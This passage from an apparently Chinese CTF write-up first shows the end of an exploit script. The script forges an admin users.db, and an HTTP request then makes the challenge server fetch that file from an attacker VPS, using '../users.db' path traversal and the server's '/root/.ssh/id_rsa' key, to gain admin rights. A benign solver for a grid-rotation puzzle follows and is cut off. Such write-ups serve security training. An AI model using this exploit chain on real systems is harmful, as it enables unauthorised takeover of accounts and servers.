</span></span><span class=line><span class=cl>        <span class=c1># 建表结构与服务端一致</span>
</span></span><span class=line><span class=cl>        <span class=n>cur</span><span class=o>.</span><span class=n>executescript</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>            PRAGMA journal_mode=WAL;
</span></span></span><span class=line><span class=cl><span class=s2>            CREATE TABLE IF NOT EXISTS users (
</span></span></span><span class=line><span class=cl><span class=s2>              id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class=line><span class=cl><span class=s2>              username TEXT UNIQUE NOT NULL,
</span></span></span><span class=line><span class=cl><span class=s2>              password TEXT NOT NULL,
</span></span></span><span class=line><span class=cl><span class=s2>              admin BOOLEAN DEFAULT 0
</span></span></span><span class=line><span class=cl><span class=s2>            );
</span></span></span><span class=line><span class=cl><span class=s2>            CREATE TABLE IF NOT EXISTS meta (
</span></span></span><span class=line><span class=cl><span class=s2>              key TEXT PRIMARY KEY,
</span></span></span><span class=line><span class=cl><span class=s2>              value TEXT NOT NULL
</span></span></span><span class=line><span class=cl><span class=s2>            );
</span></span></span><span class=line><span class=cl><span class=s2>            &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># 设置 DB 签名</span>
</span></span><span class=line><span class=cl>        <span class=n>cur</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;INSERT INTO meta(key, value) VALUES(?, ?) &#34;</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;ON CONFLICT(key) DO UPDATE SET value=excluded.value&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>(</span><span class=s2>&#34;db_id&#34;</span><span class=p>,</span> <span class=n>db_id</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># 写入管理员用户</span>
</span></span><span class=line><span class=cl>        <span class=n>cur</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;INSERT INTO users(username, password, admin) VALUES(?, ?, ?)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>(</span><span class=n>admin_username</span><span class=p>,</span> <span class=n>admin_password_hash</span><span class=p>,</span> <span class=mi>1</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>commit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>description</span><span class=o>=</span><span class=s2>&#34;从目标服务提取 DB_ID，并本地生成包含管理员用户的 users.db&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--base-url&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>default</span><span class=o>=</span><span class=s2>&#34;http://localhost:3000&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;目标服务根地址，如 http://localhost:3000&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--username&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;要写入的管理员用户名&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--password&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>default</span><span class=o>=</span><span class=s2>&#34;Admin@123&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;管理员明文密码（将计算为 bcrypt 哈希存入 DB）&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--output&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s2>&#34;./users.db&#34;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;输出的 SQLite 文件路径&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;--password-hash&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>default</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;可选：直接提供已计算好的 bcrypt 哈希，若提供将跳过本地计算&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] 目标: </span><span class=si>{</span><span class=n>args</span><span class=o>.</span><span class=n>base_url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>db_id</span> <span class=o>=</span> <span class=n>fetch_db_id</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>base_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 提取到 DB_ID: </span><span class=si>{</span><span class=n>db_id</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>password_hash</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>admin_hash</span> <span class=o>=</span> <span class=n>args</span><span class=o>.</span><span class=n>password_hash</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] 使用外部提供的 bcrypt 哈希&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] 正在生成管理员口令的 bcrypt 哈希（成本因子 10）...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>admin_hash</span> <span class=o>=</span> <span class=n>bcrypt_hash</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] bcrypt 哈希: </span><span class=si>{</span><span class=n>admin_hash</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>forge_users_db</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>output</span><span class=p>,</span> <span class=n>db_id</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>username</span><span class=p>,</span> <span class=n>admin_hash</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 已生成本地数据库: </span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>abspath</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>output</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] 后续可通过 SFTP 覆盖漏洞将该文件写回容器以生效。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] 失败: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>之后打开靶机注册账户 qqq / qqq</p><p>获取并生成users.db</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python .\message.py --base-url https://crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com/ --username qqq --password qqq --output users.db
</span></span></code></pre></td></tr></table></div></div><p>将生成的users.db放在vps的<code>/app/app</code>目录</p><p>在服务器上运行<code>fake_server.py</code>,注意检查22端口是否冲突</p><p>靶机登录qqq账户, 发包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/download</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>2</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>token=MTpxcXE%3D</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>113</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua</span><span class=o>:</span> <span class=l>&#34;Not;A=Brand&#34;;v=&#34;99&#34;, &#34;Google Chrome&#34;;v=&#34;139&#34;, &#34;Chromium&#34;;v=&#34;139&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>https://crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-origin</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>cors</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>empty</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>https://crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Priority</span><span class=o>:</span> <span class=l>u=1, i</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;host&#34;</span><span class=p>:</span><span class=s2>&#34;vps_ip&#34;</span><span class=p>,</span><span class=nt>&#34;filename&#34;</span><span class=p>:</span><span class=s2>&#34;../users.db&#34;</span><span class=p>,</span><span class=nt>&#34;keyPath&#34;</span><span class=p>:</span><span class=s2>&#34;/root/.ssh/id_rsa&#34;</span><span class=p>,</span><span class=nt>&#34;downloadPath&#34;</span><span class=p>:</span><span class=s2>&#34;/app/downloads/&#34;</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>服务器收到请求</p><p><img src=/img/2025-TFCCTF/14.png alt=1></p><p>此时qqq账户已经是admin权限</p><p>访问<code>/api/admin</code>即得flag</p><h2 id=to-rotate-or-not-to-rotate>TO ROTATE, OR NOT TO ROTATE</h2><p>基于一个3×3网格上的几何图案匹配问题，考查图案的旋转不变性识别</p><p>需要稳健地收集 mapping（确保 canonical 不重复），并在 Phase2 自动答题拿 flag,主要遇到的问题是脚本会遇到阻塞问题导致与靶机交互断开</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>import socket, ssl, <span class=k>select</span>, time, itertools, json, sys, traceback
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>HOST</span> <span class=o>=</span> <span class=s2>&#34;to-rotate-49ee3aa7dbf3db7e.challs.tfcctf.com&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>PORT</span> <span class=o>=</span> <span class=m>1337</span>
</span></span><span class=line><span class=cl><span class=nv>RECV_TIMEOUT</span> <span class=o>=</span> 30.0
</span></span><span class=line><span class=cl><span class=nv>TARGET_OKS</span> <span class=o>=</span> <span class=m>120</span>
</span></span><span class=line><span class=cl><span class=nv>SAVE_PATH</span> <span class=o>=</span> <span class=s2>&#34;canon2N.json&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ---------- grid / segments (与 server.py 一致) ----------</span>
</span></span><span class=line><span class=cl><span class=nv>POINTS</span> <span class=o>=</span> <span class=o>[(</span>x, y<span class=o>)</span> <span class=k>for</span> x in range<span class=o>(</span>3<span class=o>)</span> <span class=k>for</span> y in range<span class=o>(</span>3<span class=o>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def gcd<span class=o>(</span>a, b<span class=o>)</span>:
</span></span><span class=line><span class=cl>    <span class=k>while</span> b:
</span></span><span class=line><span class=cl>        a, <span class=nv>b</span> <span class=o>=</span> b, a % b
</span></span><span class=line><span class=cl>    <span class=k>return</span> abs<span class=o>(</span>a<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def valid_segment<span class=o>(</span>a, b<span class=o>)</span>:
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nv>a</span> <span class=o>==</span> b: <span class=k>return</span> False
</span></span><span class=line><span class=cl>    dx, <span class=nv>dy</span> <span class=o>=</span> abs<span class=o>(</span>a<span class=o>[</span>0<span class=o>]</span>-b<span class=o>[</span>0<span class=o>])</span>, abs<span class=o>(</span>a<span class=o>[</span>1<span class=o>]</span>-b<span class=o>[</span>1<span class=o>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> gcd<span class=o>(</span>dx, dy<span class=o>)</span> <span class=o>==</span> <span class=m>1</span> and <span class=m>0</span> &lt;<span class=o>=</span> a<span class=o>[</span>0<span class=o>]</span> &lt;<span class=o>=</span> <span class=m>2</span> and <span class=m>0</span> &lt;<span class=o>=</span> a<span class=o>[</span>1<span class=o>]</span> &lt;<span class=o>=</span> <span class=m>2</span> and <span class=m>0</span> &lt;<span class=o>=</span> b<span class=o>[</span>0<span class=o>]</span> &lt;<span class=o>=</span> <span class=m>2</span> and <span class=m>0</span> &lt;<span class=o>=</span> b<span class=o>[</span>1<span class=o>]</span> &lt;<span class=o>=</span> <span class=m>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>SEGMENTS</span> <span class=o>=</span> <span class=o>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> i in range<span class=o>(</span>len<span class=o>(</span>POINTS<span class=o>))</span>:
</span></span><span class=line><span class=cl>    <span class=k>for</span> j in range<span class=o>(</span>i+1, len<span class=o>(</span>POINTS<span class=o>))</span>:
</span></span><span class=line><span class=cl>        a, <span class=nv>b</span> <span class=o>=</span> POINTS<span class=o>[</span>i<span class=o>]</span>, POINTS<span class=o>[</span>j<span class=o>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> valid_segment<span class=o>(</span>a, b<span class=o>)</span>:
</span></span><span class=line><span class=cl>            A, <span class=nv>B</span> <span class=o>=</span> sorted<span class=o>([</span>a, b<span class=o>])</span>
</span></span><span class=line><span class=cl>            SEGMENTS.append<span class=o>((</span>A, B<span class=o>))</span>
</span></span><span class=line><span class=cl>assert len<span class=o>(</span>SEGMENTS<span class=o>)</span> <span class=o>==</span> <span class=m>28</span>
</span></span><span class=line><span class=cl><span class=nv>SEG_INDEX</span> <span class=o>=</span> <span class=o>{</span>SEGMENTS<span class=o>[</span>i<span class=o>]</span>: i <span class=k>for</span> i in range<span class=o>(</span>len<span class=o>(</span>SEGMENTS<span class=o>))}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def rot_point<span class=o>(</span>p, k<span class=o>)</span>:
</span></span><span class=line><span class=cl>    x, <span class=nv>y</span> <span class=o>=</span> p<span class=p>;</span> cx, <span class=nv>cy</span> <span class=o>=</span> 1, <span class=m>1</span>
</span></span><span class=line><span class=cl>    x0, <span class=nv>y0</span> <span class=o>=</span> x - cx, y - cy
</span></span><span class=line><span class=cl>    <span class=k>for</span> _ in range<span class=o>(</span>k % 4<span class=o>)</span>:
</span></span><span class=line><span class=cl>        x0, <span class=nv>y0</span> <span class=o>=</span> -y0, x0
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>(</span>x0 + cx, y0 + cy<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def rot_segment<span class=o>(</span>seg, k<span class=o>)</span>:
</span></span><span class=line><span class=cl>    a, <span class=nv>b</span> <span class=o>=</span> seg
</span></span><span class=line><span class=cl>    ra, <span class=nv>rb</span> <span class=o>=</span> rot_point<span class=o>(</span>a, k<span class=o>)</span>, rot_point<span class=o>(</span>b, k<span class=o>)</span>
</span></span><span class=line><span class=cl>    A, <span class=nv>B</span> <span class=o>=</span> sorted<span class=o>([</span>ra, rb<span class=o>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>(</span>A, B<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def canon_bits<span class=o>(</span>segs<span class=o>)</span>:
</span></span><span class=line><span class=cl>    <span class=nv>vals</span> <span class=o>=</span> <span class=o>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> k in range<span class=o>(</span>4<span class=o>)</span>:
</span></span><span class=line><span class=cl>        <span class=nv>bits</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=o>(</span>a, b<span class=o>)</span> in segs:
</span></span><span class=line><span class=cl>            A, <span class=nv>B</span> <span class=o>=</span> sorted<span class=o>([</span>a, b<span class=o>])</span>
